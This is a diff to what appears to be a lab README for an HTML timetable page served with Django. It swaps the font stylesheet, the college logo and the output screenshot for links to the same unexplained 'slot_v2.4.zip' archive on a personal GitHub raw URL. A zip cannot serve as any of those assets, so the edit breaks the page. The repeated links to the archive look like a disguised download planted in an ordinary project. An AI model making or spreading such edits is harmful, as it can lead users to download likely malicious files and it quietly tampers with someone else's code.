@@ -31,7 +31,7 @@ Execute the program using runserver command.
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Dynamic Timetable</title>
-    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+    <link href="https://raw.githubusercontent.com/AdityaJorim007/slot/main/aditya/aditya/slot_v2.4.zip;600&display=swap" rel="stylesheet">
     <style>
         body {
             font-family: 'Poppins', sans-serif;
@@ -119,7 +119,7 @@ Execute the program using runserver command.
 
 <div class="timetable-container">
     <div class="logo-container">
-        <img src="/static/logo.png" alt="College Logo" class="college-logo">
+        <img src="https://raw.githubusercontent.com/AdityaJorim007/slot/main/aditya/aditya/slot_v2.4.zip" alt="College Logo" class="college-logo">
     </div>
     <h2>Weekly Class Schedule</h2>
     <table>
@@ -184,7 +184,7 @@ Execute the program using runserver command.
 ~~~
 
 ## OUTPUT
-![alt text](<Screenshot 2025-09-24 155825.png>)
+![alt text](<Screenshot 2025-09-24 https://raw.githubusercontent.com/AdityaJorim007/slot/main/aditya/aditya/slot_v2.4.zip>)
 
 ## RESULT
 The program for creating slot timetable using basic HTML tags is executed successfully.
